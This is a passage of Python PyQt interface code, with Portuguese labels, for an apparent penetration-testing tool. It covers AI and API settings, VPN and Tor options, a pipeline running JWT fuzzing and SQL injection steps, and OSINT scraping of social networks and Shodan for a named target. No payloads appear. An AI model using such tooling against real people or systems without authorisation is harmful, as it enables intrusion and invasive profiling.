        """Incrementa contador de tokens analisados no Dashboard"""
        # increment dashboard counter and update label
        self.tokens_count += 1
        self.token_count_label.setText(str(self.tokens_count))

    def save_dashboard_log(self):
        """Save dashboard log to file"""
        fname, _ = QFileDialog.getSaveFileName(self, 'Salvar Log', '', 'Text Files (*.txt);;All Files (*)')
        if fname:
            try:
                with open(fname, 'w', encoding='utf-8') as f:
                    f.write(self.dashboard_console.toPlainText())
            except Exception as e:
                logging.error(f"Erro ao salvar log: {e}")

    def setup_settings_tab(self):
        # Settings tab with scrollable area
        settings_scroll = QScrollArea()
        settings_scroll.setWidgetResizable(True)
        settings_widget = QWidget()
        settings_scroll.setWidget(settings_widget)
        main_layout = QVBoxLayout(settings_widget)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(10)

        # Group: Configuração de Provedor de IA
        ai_group = QGroupBox('Configuração de Provedor de IA')
        ai_group.setContentsMargins(5, 5, 5, 5)
        ai_layout = QVBoxLayout(ai_group)
        # Provider selector
        provider_form = QFormLayout()
        self.ai_provider_combo = QComboBox()
        self.ai_provider_combo.addItems(['OpenAI', 'Pentest Muse', 'LibreChat'])
        provider_form.addRow('Selecionar Provedor de IA:', self.ai_provider_combo)
        ai_layout.addLayout(provider_form)
        # Stacked widget for provider-specific forms
        self.ai_stack = QStackedWidget()
        # OpenAI form
        page_openai = QWidget()
        openai_form = QFormLayout(page_openai)
        self.openai_key_edit = QLineEdit()
        self.openai_key_edit.setEchoMode(QLineEdit.Password)
        openai_form.addRow('OpenAI API Key:', self.openai_key_edit)
        self.openai_test_btn = QPushButton('Testar Conexão')
        self.openai_test_btn.clicked.connect(lambda: self.handle_test_ai('OpenAI'))
        openai_form.addRow(self.openai_test_btn)
        self.openai_status_label = QLabel('')
        openai_form.addRow(self.openai_status_label)
        self.ai_stack.addWidget(page_openai)
        # Pentest Muse form
        page_muse = QWidget()
        muse_form = QFormLayout(page_muse)
        self.pentest_muse_key_edit = QLineEdit()
        self.pentest_muse_key_edit.setEchoMode(QLineEdit.Password)
        muse_form.addRow('Pentest Muse API Key:', self.pentest_muse_key_edit)
        self.pentest_muse_test_btn = QPushButton('Testar Conexão')
        self.pentest_muse_test_btn.clicked.connect(lambda: self.handle_test_ai('Pentest Muse'))
        muse_form.addRow(self.pentest_muse_test_btn)
        self.pentest_muse_status_label = QLabel('')
        muse_form.addRow(self.pentest_muse_status_label)
        self.ai_stack.addWidget(page_muse)
        # LibreChat form
        page_libre = QWidget()
        libre_form = QFormLayout(page_libre)
        self.librechat_endpoint_edit = QLineEdit()
        libre_form.addRow('Endpoint LibreChat:', self.librechat_endpoint_edit)
        self.librechat_test_btn = QPushButton('Testar Conexão')
        self.librechat_test_btn.clicked.connect(lambda: self.handle_test_ai('LibreChat'))
        libre_form.addRow(self.librechat_test_btn)
        self.librechat_status_label = QLabel('')
        libre_form.addRow(self.librechat_status_label)
        self.ai_stack.addWidget(page_libre)
        # Connect selector to stack
        self.ai_provider_combo.currentIndexChanged.connect(self.ai_stack.setCurrentIndex)
        ai_layout.addWidget(self.ai_stack)
        # Save AI settings button
        self.save_ai_btn = QPushButton('Salvar Configurações')
        self.save_ai_btn.clicked.connect(self.save_ai_settings)
        ai_layout.addWidget(self.save_ai_btn, alignment=Qt.AlignCenter)
        main_layout.addWidget(ai_group)

        # Group: Integração de API
        integ_group = QGroupBox('Integração de API')
        integ_group.setContentsMargins(5,5,5,5)
        integ_layout = QFormLayout(integ_group)
        # Selector for external APIs
        self.integration_combo = QComboBox()
        providers = ['OpenAI', 'Mistral', 'Anthropic', 'Void Sync API', 'IPStack', 'MarketStack', 'WeatherStack', 'Fixer', 'NumVerify']
        self.integration_combo.addItems(providers)
        integ_layout.addRow('API de Integração:', self.integration_combo)
        # Stacked widget for provider-specific settings
        self.integration_stack = QStackedWidget()
        for prov in providers:
            page = QWidget()
            form = QFormLayout(page)
            if prov == 'Void Sync API':
                self.void_key_edit = QLineEdit()
                self.void_key_edit.setEchoMode(QLineEdit.Password)
                form.addRow('Void Sync API Key:', self.void_key_edit)
                self.void_scraper_checkbox = QCheckBox('Ativar integração no Scraper')
                form.addRow(self.void_scraper_checkbox)
                self.void_wordlist_checkbox = QCheckBox('Ativar integração na Wordlist')
                form.addRow(self.void_wordlist_checkbox)
            elif prov == 'IPStack':
                self.ipstack_key_edit = QLineEdit()
                self.ipstack_key_edit.setEchoMode(QLineEdit.Password)
                form.addRow('IPStack API Key:', self.ipstack_key_edit)
                self.ipstack_test_btn = QPushButton('Testar IPStack')
                self.ipstack_test_btn.clicked.connect(lambda: self.handle_test_external_api('IPStack'))
                form.addRow(self.ipstack_test_btn)
                self.ipstack_status_label = QLabel('')
                form.addRow(self.ipstack_status_label)
            elif prov == 'MarketStack':
                self.marketstack_key_edit = QLineEdit()
                self.marketstack_key_edit.setEchoMode(QLineEdit.Password)
                form.addRow('MarketStack API Key:', self.marketstack_key_edit)
                self.marketstack_test_btn = QPushButton('Testar MarketStack')
                self.marketstack_test_btn.clicked.connect(lambda: self.handle_test_external_api('MarketStack'))
                form.addRow(self.marketstack_test_btn)
                self.marketstack_status_label = QLabel('')
                form.addRow(self.marketstack_status_label)
            elif prov == 'WeatherStack':
                self.weatherstack_key_edit = QLineEdit()
                self.weatherstack_key_edit.setEchoMode(QLineEdit.Password)
                form.addRow('WeatherStack API Key:', self.weatherstack_key_edit)
                self.weatherstack_test_btn = QPushButton('Testar WeatherStack')
                self.weatherstack_test_btn.clicked.connect(lambda: self.handle_test_external_api('WeatherStack'))
                form.addRow(self.weatherstack_test_btn)
                self.weatherstack_status_label = QLabel('')
                form.addRow(self.weatherstack_status_label)
            elif prov == 'Fixer':
                self.fixer_key_edit = QLineEdit()
                self.fixer_key_edit.setEchoMode(QLineEdit.Password)
                form.addRow('Fixer API Key:', self.fixer_key_edit)
                self.fixer_test_btn = QPushButton('Testar Fixer')
                self.fixer_test_btn.clicked.connect(lambda: self.handle_test_external_api('Fixer'))
                form.addRow(self.fixer_test_btn)
                self.fixer_status_label = QLabel('')
                form.addRow(self.fixer_status_label)
            elif prov == 'NumVerify':
                self.numverify_key_edit = QLineEdit()
                self.numverify_key_edit.setEchoMode(QLineEdit.Password)
                form.addRow('NumVerify API Key:', self.numverify_key_edit)
                self.numverify_test_btn = QPushButton('Testar NumVerify')
                self.numverify_test_btn.clicked.connect(lambda: self.handle_test_external_api('NumVerify'))
                form.addRow(self.numverify_test_btn)
                self.numverify_status_label = QLabel('')
                form.addRow(self.numverify_status_label)
            # Other providers: empty form
            self.integration_stack.addWidget(page)
        self.integration_combo.currentIndexChanged.connect(self.integration_stack.setCurrentIndex)
        integ_layout.addRow(self.integration_stack)
        main_layout.addWidget(integ_group)

        # Network Settings (VPN/Tor)
        net_group = QGroupBox('Network Settings')
        net_group.setContentsMargins(5,5,5,5)
        net_layout = QFormLayout(net_group)
        # VPN config file picker
        self.vpn_config_edit = QLineEdit()
        self.vpn_config_edit.setPlaceholderText('Caminho para arquivo .ovpn')
        vpn_browse = QPushButton('Browse')
        vpn_browse.clicked.connect(self.browse_vpn_config)
        net_layout.addRow('OpenVPN .ovpn:', self.vpn_config_edit)
        net_layout.addRow('', vpn_browse)
        self.vpn_connect_btn = QPushButton('Connect VPN')
        self.vpn_disconnect_btn = QPushButton('Disconnect VPN')
        self.vpn_connect_btn.clicked.connect(self.connect_vpn)
        self.vpn_disconnect_btn.clicked.connect(self.disconnect_vpn)
        net_layout.addRow(self.vpn_connect_btn, self.vpn_disconnect_btn)
        # Tor config
        self.tor_path_edit = QLineEdit()
        self.tor_path_edit.setPlaceholderText('Caminho para tor.exe')
        tor_browse = QPushButton('Browse')
        tor_browse.clicked.connect(self.browse_tor_path)
        net_layout.addRow('Tor Executable:', self.tor_path_edit)
        net_layout.addRow('', tor_browse)
        self.tor_checkbox = QCheckBox('Enable Tor')
        self.tor_checkbox.stateChanged.connect(self.toggle_tor)
        net_layout.addRow(self.tor_checkbox)
        main_layout.addWidget(net_group)

        # Pre-load any saved AI settings
        self.load_ai_settings()

        # Add the settings tab
        self.tabs.addTab(settings_scroll, 'Config')

    def load_ai_settings(self):
        """
        Load AI settings from JSON file and pre-fill the form.
        """
        config_path = os.path.join('config', 'ai_settings.json')
        try:
            if os.path.isfile(config_path):
                with open(config_path, 'r', encoding='utf-8') as f:
                    cfg = json.load(f)
                sel = cfg.get('selected_ai', '')
                idx = self.ai_provider_combo.findText(sel)
                if idx != -1:
                    self.ai_provider_combo.setCurrentIndex(idx)
                self.openai_key_edit.setText(cfg.get('openai_key', ''))
                self.pentest_muse_key_edit.setText(cfg.get('pentest_muse_key', ''))
                self.librechat_endpoint_edit.setText(cfg.get('librechat_endpoint', ''))
                # Integration settings
                self.integration_combo.setCurrentText(cfg.get('integration_api', ''))
                self.void_key_edit.setText(cfg.get('void_key', ''))
                self.void_scraper_checkbox.setChecked(cfg.get('void_scraper', False))
                self.void_wordlist_checkbox.setChecked(cfg.get('void_wordlist', False))
                self.ipstack_key_edit.setText(cfg.get('ipstack_key', ''))
                self.marketstack_key_edit.setText(cfg.get('marketstack_key', ''))
                self.weatherstack_key_edit.setText(cfg.get('weatherstack_key', ''))
                self.fixer_key_edit.setText(cfg.get('fixer_key', ''))
                self.numverify_key_edit.setText(cfg.get('numverify_key', ''))
        except Exception as e:
            print(f'Error loading AI settings: {e}')

    def handle_test_ai(self, provider):
        config = {}
        if provider == 'OpenAI':
            config['openai_key'] = self.openai_key_edit.text().strip()
        elif provider == 'Pentest Muse':
            config['pentest_muse_key'] = self.pentest_muse_key_edit.text().strip()
        elif provider == 'LibreChat':
            config['librechat_endpoint'] = self.librechat_endpoint_edit.text().strip()
        ok, msg = test_ai_connection(provider, config)
        label_map = {
            'OpenAI': self.openai_status_label,
            'Pentest Muse': self.pentest_muse_status_label,
            'LibreChat': self.librechat_status_label
        }
        label = label_map.get(provider)
        if ok:
            label.setText('✅ Conectado com sucesso')
        else:
            label.setText(f'❌ Erro: {msg}')

    def save_ai_settings(self):
        ai_settings = {
            'selected_ai': self.ai_provider_combo.currentText(),
            'openai_key': self.openai_key_edit.text().strip(),
            'pentest_muse_key': self.pentest_muse_key_edit.text().strip(),
            'librechat_endpoint': self.librechat_endpoint_edit.text().strip(),
            'integration_api': self.integration_combo.currentText(),
            'void_key': self.void_key_edit.text().strip(),
            'void_scraper': self.void_scraper_checkbox.isChecked(),
            'void_wordlist': self.void_wordlist_checkbox.isChecked(),
            'ipstack_key': self.ipstack_key_edit.text().strip(),
            'marketstack_key': self.marketstack_key_edit.text().strip(),
            'weatherstack_key': self.weatherstack_key_edit.text().strip(),
            'fixer_key': self.fixer_key_edit.text().strip(),
            'numverify_key': self.numverify_key_edit.text().strip()
        }
        os.makedirs('config', exist_ok=True)
        with open(os.path.join('config', 'ai_settings.json'), 'w', encoding='utf-8') as f:
            json.dump(ai_settings, f, indent=4)
        QMessageBox.information(self, 'Configurações', 'Configurações de IA salvas com sucesso.')

    def setup_reports_tab(self):
        """Aba de Relatórios aprimorada com console de logs e gráficos de pizza"""
        reports_tab = QWidget()
        h_layout = QHBoxLayout(reports_tab)
        # Lado esquerdo: console de logs
        self.reports_log = QTextEdit()
        self.reports_log.setReadOnly(True)
        self.reports_log.setStyleSheet('background-color: #3a3a3a; color: #eee;')
        h_layout.addWidget(self.reports_log)
        # Lado direito: gráficos de pizza (se matplotlib disponível)
        if HAS_MATPLOTLIB:
            chart_group = QGroupBox('Estatísticas de Execução')
            chart_layout = QVBoxLayout(chart_group)
            self.report_fig = Figure(figsize=(4,4))
            self.report_canvas = FigureCanvas(self.report_fig)
            chart_layout.addWidget(self.report_canvas)
            h_layout.addWidget(chart_group)
        else:
            placeholder = QLabel('matplotlib não instalado')
            placeholder.setAlignment(Qt.AlignCenter)
            h_layout.addWidget(placeholder)
        # Adiciona aba
        self.tabs.addTab(reports_tab, 'Relatórios')
        # Conecta logging ao console de relatórios
        handler_reports = QtLogHandler(self.reports_log)
        handler_reports.setLevel(logging.INFO)
        handler_reports.setFormatter(logging.Formatter('[%(asctime)s] %(message)s', '%H:%M:%S'))
        logger = logging.getLogger()
        logger.addHandler(handler_reports)
        # Inicializa contadores para o gráfico
        self.report_counts = {'Sucesso': 0, 'Falha': 0, 'Vulnerabilidade': 0}
        if HAS_MATPLOTLIB:
            self.update_report_chart()

    def update_report_chart(self):
        """Atualiza o gráfico de pizza com base em report_counts"""
        self.report_fig.clear()
        ax = self.report_fig.add_subplot(111)
        labels = list(self.report_counts.keys())
        sizes = list(self.report_counts.values())
        colors = ['#1abc9c', '#e74c3c', '#f1c40f']
        total = sum(sizes)
        if total > 0:
            ax.pie(sizes, labels=labels, colors=colors, autopct='%1.1f%%', startangle=90)
            ax.axis('equal')
        else:
            ax.text(0.5, 0.5, 'Sem dados disponíveis', ha='center', va='center', transform=ax.transAxes, color='#eee')
        self.report_canvas.draw()

    def generate_report(self):
        """Generate HTML report and add to the list with button feedback"""
        self.report_generate_btn.setText('Executando...')
        threading.Thread(target=self._do_report, daemon=True).start()

    def _do_report(self):
        path = generate_html_report('output/results.json', 'reports/report.html')
        def finish():
            self.report_list.addItem(QListWidgetItem(path))
            self.report_generate_btn.setText('Finalizado com sucesso')
            QTimer.singleShot(2000, lambda: self.report_generate_btn.setText('📄 Relatório HTML'))
        QTimer.singleShot(0, finish)

    def view_report(self):
        """Stub: open the selected report"""
        selected = self.report_list.currentItem()
        if selected:
            # TODO: implement report viewing (e.g., open in browser)
            print(f"Viewing report: {selected.text()}")

    def setup_pipeline_tab(self):
        """Setup the Pipeline tab with 2-column checkboxes, progress bar, and execute button"""
        pipeline_tab = QWidget()
        layout = QVBoxLayout(pipeline_tab)
        # margins and spacing
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(10)
        # Title
        title = QLabel("Pipeline de Testes")
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet("font-size: 14px; font-weight: bold;")
        layout.addWidget(title)
        # Grid of checkboxes
        grid = QGridLayout()
        grid.setHorizontalSpacing(20)
        grid.setVerticalSpacing(10)
        steps = ["OSINT","Varredura de Alvo","Análise de Token","Crypto Analysis","Wordlist Generation","Fuzzing JWT","SQL Injection"]
        self.pipeline_checks = {}
        for idx, step in enumerate(steps):
            cb = QCheckBox(step)
            self.pipeline_checks[step] = cb
            row = idx // 2
            col = idx % 2
            grid.addWidget(cb, row, col)
        layout.addLayout(grid)
        # Progress bar
        self.pipeline_bar = QProgressBar()
        self.pipeline_bar.setValue(0)
        self.pipeline_bar.setFormat("%p%")
        layout.addWidget(self.pipeline_bar)
        # Execute button
        run_btn = QPushButton("Executar Pipeline")
        # add icon
        run_btn.setIcon(QIcon(os.path.join(os.path.dirname(__file__), 'assets', 'icon.png')))
        run_btn.setIconSize(QSize(16,16))
        run_btn.setToolTip("Executa o pipeline selecionado")
        run_btn.clicked.connect(self.run_pipeline)
        layout.addWidget(run_btn, alignment=Qt.AlignCenter)
        # Add tab
        self.tabs.addTab(pipeline_tab, "Pipeline")
        # Botão parar Pipeline
        self.pipeline_stop_btn = QPushButton('Parar Pipeline')
        self.pipeline_stop_btn.setEnabled(False)
        self.pipeline_stop_btn.clicked.connect(self.stop_pipeline)
        layout.addWidget(self.pipeline_stop_btn, alignment=Qt.AlignCenter)
        # Console de logs do pipeline
        self.pipeline_log = QTextEdit()
        self.pipeline_log.setReadOnly(True)
        layout.addWidget(self.pipeline_log)

    def run_pipeline(self):
        selected = [cb.text() for cb in self.pipeline_checks.values() if cb.isChecked()]
        count = len(selected)
        if count == 0:
            self.pipeline_log.append('Nenhum passo selecionado no pipeline.')
            return
        # Preparar UI
        self._pipeline_abort.clear()
        self.pipeline_bar.setValue(0)
        self.pipeline_stop_btn.setEnabled(True)
        self.pipeline_log.append('Iniciando pipeline...')
        # Executa pipeline em thread para não bloquear UI
        def pipeline_task():
            for i, step in enumerate(selected):
                if self._pipeline_abort.is_set():
                    break
                # Log e ação do passo
                QTimer.singleShot(0, lambda step=step, i=i: self.pipeline_log.append(f'[{i+1}/{count}] Executando: {step}'))
                if step == 'OSINT':
                    QTimer.singleShot(0, self.run_osint)
                elif step == 'Varredura de Alvo':
                    QTimer.singleShot(0, self.run_scan)
                elif step == 'Análise de Token':
                    QTimer.singleShot(0, self.run_jwt_analysis)
                elif step == 'Crypto Analysis':
                    QTimer.singleShot(0, self.run_crypto)
                elif step == 'Wordlist Generation':
                    QTimer.singleShot(0, self.run_wordlist)
                elif step == 'Fuzzing JWT':
                    QTimer.singleShot(0, self.run_fuzz)
                elif step == 'SQL Injection':
                    QTimer.singleShot(0, self.run_sql_injection_jwt)
                # Atualiza progresso
                QTimer.singleShot(0, lambda i=i: self.pipeline_bar.setValue(int((i+1)/count*100)))
                # Intervalo mínimo entre passos
                time.sleep(1)
            # Finaliza pipeline
            QTimer.singleShot(0, self.finish_pipeline)
            QTimer.singleShot(0, lambda: self.pipeline_log.append('Pipeline completo.'))
        threading.Thread(target=pipeline_task, daemon=True).start()

    def stop_pipeline(self):
        """Abort pipeline execution"""
        self._pipeline_abort.set()
        self.pipeline_bar.setValue(0)
        self.pipeline_log.append('Pipeline interrompido pelo usuário')
        self.pipeline_stop_btn.setEnabled(False)
        self.pipeline_stop_btn.setText('Pipeline interrompido')
    def finish_pipeline(self):
        """Restore UI after pipeline completes"""
        self.pipeline_stop_btn.setEnabled(False)
        self.pipeline_bar.setValue(100)
        self.pipeline_stop_btn.setText('Parar Pipeline')
        self.pipeline_log.append('Pipeline finalizado com sucesso')

    def setup_osint_tab(self):
        """Setup OSINT Integrado tab"""
        # Cria container para o conteúdo com layout vertical
        osintContainer = QWidget()
        osint_layout = QVBoxLayout(osintContainer)
        osint_layout.setContentsMargins(10, 10, 10, 10)
        osint_layout.setSpacing(20)
        
        # Adiciona barra de rolagem para todo o conteúdo
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        scroll.setWidget(osintContainer)
        self.tabs.addTab(scroll, 'OSINT Integrado')

        # Identificação do Alvo
        id_group = QGroupBox('Identificação do Alvo')
        id_group.setContentsMargins(10, 10, 10, 10)
        id_group.setToolTip('Este campo será usado como base para todas as buscas')
        id_layout = QVBoxLayout(id_group)
        id_layout.setSpacing(15)
        self.osint_target_entry = QLineEdit()
        self.osint_target_entry.setPlaceholderText('Ex: fulano123 ou empresa.com')
        self.osint_target_entry.setToolTip('Campo base para todas as buscas')
        id_layout.addWidget(self.osint_target_entry)
        osint_layout.addWidget(id_group)

        # Redes Sociais
        social_group = QGroupBox('Redes Sociais')
        social_group.setContentsMargins(10, 10, 10, 10)
        social_layout = QGridLayout(social_group)
        social_layout.setSpacing(15)
        social_options = ['Facebook', 'X (Twitter)', 'Instagram', 'Discord', 'YouTube', 'Threads', 'Reddit', 'Telegram']
        self.osint_social_checks = {}
        for idx, name in enumerate(social_options):
            cb = QCheckBox(name)
            cb.setToolTip(f'Incluir {name} na busca')
            self.osint_social_checks[name] = cb
            social_layout.addWidget(cb, idx // 4, idx % 4)
        osint_layout.addWidget(social_group)

        # Mecanismos de Busca
        search_group = QGroupBox('Mecanismos de Busca')
        search_group.setContentsMargins(10, 10, 10, 10)
        search_layout = QHBoxLayout(search_group)
        search_layout.setSpacing(15)
        search_options = ['Google', 'Bing', 'Yahoo']
        self.osint_engine_checks = {}
        for name in search_options:
            cb = QCheckBox(name)
            cb.setToolTip(f'Incluir {name} na busca')
            self.osint_engine_checks[name] = cb
            search_layout.addWidget(cb)
        osint_layout.addWidget(search_group)

        # Scraping de Domínios
        domain_group = QGroupBox('Scraping de Domínios')
        domain_group.setContentsMargins(10, 10, 10, 10)
        domain_layout = QVBoxLayout(domain_group)
        domain_layout.setSpacing(15)
        # Domínio Base
        h_domain = QHBoxLayout()
        h_domain.addWidget(QLabel('Domínio Base:'))
        self.osint_domain_entry = QLineEdit()
        self.osint_domain_entry.setPlaceholderText('.com ou empresa.com')
        self.osint_domain_entry.setToolTip('Domínio base para scraping')
        h_domain.addWidget(self.osint_domain_entry)
        domain_layout.addLayout(h_domain)
        # Tipos de Domínio
        tlds_group = QGroupBox('Tipos de Domínio')
        tlds_group.setContentsMargins(10, 10, 10, 10)
        tlds_layout = QGridLayout(tlds_group)
        tlds_layout.setSpacing(15)
        tlds = ['.com', '.br', '.gov', '.org', '.edu']
        self.osint_tld_checks = {}
        for idx, tl in enumerate(tlds):
            cb = QCheckBox(tl)
            cb.setToolTip(f'Incluir domínio {tl}')
            self.osint_tld_checks[tl] = cb
            tlds_layout.addWidget(cb, idx // 3, idx % 3)
        domain_layout.addWidget(tlds_group)
        # ccTLDs ComboBox
        self.osint_cctld_combo = QComboBox()
        cc_tlds = ['.ac', '.ad', '.ae', '.af', '.ag', '.ai', '.al', '.am', '.ao', '.aq', '.ar', '.as', '.at', '.au', '.aw', '.ax', '.az', '.ba', '.bb', '.bd', '.be', '.bf', '.bg', '.bh', '.bi', '.bj', '.bm', '.bn', '.bo', '.bq', '.br', '.bs', '.bt', '.bv', '.bw', '.by', '.bz', '.ca', '.cc', '.cd', '.cf', '.cg', '.ch', '.ci', '.ck', '.cl', '.cm', '.cn', '.co', '.cr', '.cu', '.cv', '.cw', '.cx', '.cy', '.cz', '.de', '.dj', '.dk', '.dm', '.do', '.dz', '.ec', '.ee', '.eg', '.eh', '.er', '.es', '.et', '.eu', '.fi', '.fj', '.fk', '.fm', '.fo', '.fr', '.ga', '.gb', '.gd', '.ge', '.gf', '.gg', '.gh', '.gi', '.gl', '.gm', '.gn', '.gp', '.gq', '.gr', '.gs', '.gt', '.gu', '.gw', '.gy', '.hk', '.hm', '.hn', '.hr', '.ht', '.hu', '.id', '.ie', '.il', '.im', '.in', '.io', '.iq', '.ir', '.is', '.it', '.je', '.jm', '.jo', '.jp', '.ke', '.kg', '.kh', '.ki', '.km', '.kn', '.kp', '.kr', '.kw', '.ky', '.kz', '.la', '.lb', '.lc', '.li', '.lk', '.lr', '.ls', '.lt', '.lu', '.lv', '.ly', '.ma', '.mc', '.md', '.me', '.mg', '.mh', '.mk', '.ml', '.mm', '.mn', '.mo', '.mp', '.mq', '.mr', '.ms', '.mt', '.mu', '.mv', '.mw', '.mx', '.my', '.mz', '.na', '.nc', '.ne', '.nf', '.ng', '.ni', '.nl', '.no', '.np', '.nr', '.nu', '.nz', '.om', '.pa', '.pe', '.pf', '.pg', '.ph', '.pk', '.pl', '.pm', '.pn', '.pr', '.ps', '.pt', '.pw', '.py', '.qa', '.re', '.ro', '.rs', '.ru', '.rw', '.sa', '.sb', '.sc', '.sd', '.se', '.sg', '.sh', '.si', '.sj', '.sk', '.sl', '.sm', '.sn', '.so', '.sr', '.ss', '.st', '.su', '.sv', '.sx', '.sy', '.sz', '.tc', '.td', '.tf', '.tg', '.th', '.tj', '.tk', '.tl', '.tm', '.tn', '.to', '.tr', '.tt', '.tv', '.tw', '.tz', '.ua', '.ug', '.uk', '.us', '.uy', '.uz', '.va', '.vc', '.ve', '.vg', '.vi', '.vn', '.vu', '.wf', '.ws', '.ye', '.yt', '.za', '.zm', '.zw']
        self.osint_cctld_combo.addItems(sorted(cc_tlds))
        self.osint_cctld_combo.setToolTip('Selecione um ccTLD adicional')
        domain_layout.addWidget(self.osint_cctld_combo)
        osint_layout.addWidget(domain_group)

        # Configurações Avançadas
        adv_group = QGroupBox('Configurações Avançadas')
        adv_group.setContentsMargins(10, 10, 10, 10)
        adv_layout = QGridLayout(adv_group)
        adv_layout.setSpacing(15)
        adv_layout.addWidget(QLabel('Máximo de Resultados por Plataforma:'), 0, 0)
        self.osint_max_results = QSpinBox()
        self.osint_max_results.setValue(50)
        self.osint_max_results.setToolTip('Número máximo de resultados por plataforma')
        adv_layout.addWidget(self.osint_max_results, 0, 1)
        adv_layout.addWidget(QLabel('Delay entre Requisições (s):'), 1, 0)
        self.osint_delay = QSpinBox()
        self.osint_delay.setValue(2)
        self.osint_delay.setToolTip('Delay entre requisições em segundos')
        adv_layout.addWidget(self.osint_delay, 1, 1)
        self.osint_save_html = QCheckBox('Salvar resultados em HTML')
        self.osint_save_html.setToolTip('Salvar resultados em arquivo HTML')
        adv_layout.addWidget(self.osint_save_html, 2, 0, 1, 2)
        self.osint_export_json = QCheckBox('Exportar JSON')
        self.osint_export_json.setToolTip('Exportar resultados em formato JSON')
        adv_layout.addWidget(self.osint_export_json, 3, 0, 1, 2)
        # Incluir TheHarvester para busca adicional
        self.osint_use_harvester = QCheckBox('Incluir theHarvester')
        self.osint_use_harvester.setToolTip('Executar theHarvester para coleta adicional')
        adv_layout.addWidget(self.osint_use_harvester, 4, 0, 1, 2)
        # Incluir Shodan para busca adicional
        self.osint_use_shodan = QCheckBox('Incluir Shodan')
        self.osint_use_shodan.setToolTip('Executar consultas Shodan')
        adv_layout.addWidget(self.osint_use_shodan, 5, 0, 1, 2)
        osint_layout.addWidget(adv_group)

        # Execução e Logs
        exec_group = QGroupBox('Execução e Logs')
        exec_group.setContentsMargins(10, 10, 10, 10)
        exec_layout = QVBoxLayout(exec_group)
        exec_layout.setSpacing(15)
        self.osint_run_btn = QPushButton('Executar Scraping OSINT')
        self.osint_run_btn.setToolTip('Inicia o processo de scraping OSINT')
        self.osint_run_btn.clicked.connect(self.run_osint)
        exec_layout.addWidget(self.osint_run_btn, alignment=Qt.AlignCenter)
        # Botão de parar OSINT
        self.osint_stop_btn = QPushButton('Parar Scraping OSINT')
        self.osint_stop_btn.setToolTip('Para o processo de scraping OSINT')
        self.osint_stop_btn.setEnabled(False)
        self.osint_stop_btn.clicked.connect(self.stop_osint)
        exec_layout.addWidget(self.osint_stop_btn, alignment=Qt.AlignCenter)
        h_progress = QHBoxLayout()
        h_progress.addWidget(QLabel('Progresso:'))
        self.osint_progress = QProgressBar()
        self.osint_progress.setValue(0)
        self.osint_progress.setToolTip('Barra de progresso do scraping')
        h_progress.addWidget(self.osint_progress)
        exec_layout.addLayout(h_progress)
        self.osint_log = QTextEdit()
        self.osint_log.setReadOnly(True)
        self.osint_log.setStyleSheet('background-color: #3a3a3a; color: #eee;')
        exec_layout.addWidget(self.osint_log)
        self.osint_spinner = QLabel()
        self.osint_spinner.setAlignment(Qt.AlignCenter)
        spinner_movie = QMovie(os.path.join(os.path.dirname(__file__), 'assets', 'spinner.gif'))
        self.osint_spinner.setMovie(spinner_movie)
        spinner_movie.start()
        exec_layout.addWidget(self.osint_spinner)
        osint_layout.addWidget(exec_group)
        # Conecta sinais de log e progresso do OSINT
        self.osint_log_signal.connect(self.osint_log.append)
        self.osint_progress_signal.connect(self.osint_progress.setValue)
        # Botões para salvar e exibir resultados do OSINT
        btn_layout = QHBoxLayout()
        self.osint_save_btn = QPushButton('Salvar Dados')
        self.osint_save_btn.setToolTip('Salvar resultados do OSINT em uma pasta')
        self.osint_save_btn.clicked.connect(self.save_osint_results)
        btn_layout.addWidget(self.osint_save_btn, alignment=Qt.AlignCenter)
        self.osint_view_btn = QPushButton('Exibir Resultados')
        self.osint_view_btn.setToolTip('Exibir resultados do OSINT em uma janela')
        self.osint_view_btn.clicked.connect(self.view_osint_results)
        btn_layout.addWidget(self.osint_view_btn, alignment=Qt.AlignCenter)
        exec_layout.addLayout(btn_layout)

    def run_osint(self):
        """Start OSINT scraping based on GUI selections."""
        # Monta configuração a partir da GUI
        config = {
            'alvo': self.osint_target_entry.text().strip(),
            'redes_sociais': [name for name, cb in self.osint_social_checks.items() if cb.isChecked()],
            'motores_busca': [name for name, cb in self.osint_engine_checks.items() if cb.isChecked()],
            'dominios': [tld for tld, cb in self.osint_tld_checks.items() if cb.isChecked()] + ([self.osint_cctld_combo.currentText()] if self.osint_cctld_combo.currentText() else []),
            'limite_resultados': self.osint_max_results.value(),
            'delay': self.osint_delay.value(),
            'export_html': self.osint_save_html.isChecked(),
            'export_json': self.osint_export_json.isChecked(),
            'use_harvester': self.osint_use_harvester.isChecked(),
            'use_shodan': self.osint_use_shodan.isChecked()
        }
        if not config['alvo']:
            self.osint_log_signal.emit('Informe um alvo antes de iniciar.')
            return
        # Limpa log, reseta progresso e controla botões
        self.osint_log.clear()
        self.osint_progress.setValue(0)
        self._osint_abort.clear()
        self.osint_run_btn.setEnabled(False)
        self.osint_stop_btn.setEnabled(True)
        # Callbacks para log e progresso (emitindo sinais)
        def handle_log(msg):
            logging.info(msg)
            self.osint_log_signal.emit(msg)
        def handle_progress(val):
            logging.info(f'[OSINT] Progresso: {val}%')
            self.osint_progress_signal.emit(val)
        # Inicia thread de scraping e armazena resultados
        def osint_task():
            results = run_osint_scraping(config, handle_log, handle_progress)
            self.osint_results = results
        threading.Thread(target=osint_task, daemon=True).start()
    def finish_osint(self):
        """Restore OSINT controls after finish"""
        self.osint_run_btn.setEnabled(True)
        self.osint_stop_btn.setEnabled(False)
        self.osint_run_btn.setText('Executar Scraping OSINT')
    def stop_osint(self):
        """Abort OSINT scraping"""
        self._osint_abort.set()
        self.osint_log_signal.emit('OSINT cancelado pelo usuário')
        self.osint_stop_btn.setEnabled(False)
        self.osint_run_btn.setEnabled(True)

    def save_osint_results(self):
        """Save OSINT results to selected folder."""
        if not hasattr(self, 'osint_results') or not self.osint_results:
            QMessageBox.warning(self, 'Aviso', 'Nenhum resultado para salvar.')
            return
        dir_path = QFileDialog.getExistingDirectory(self, 'Selecione a pasta para salvar os resultados')
        if not dir_path:
            return
        try:
            filename = os.path.join(dir_path, f'osint_results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.osint_results, f, ensure_ascii=False, indent=2)
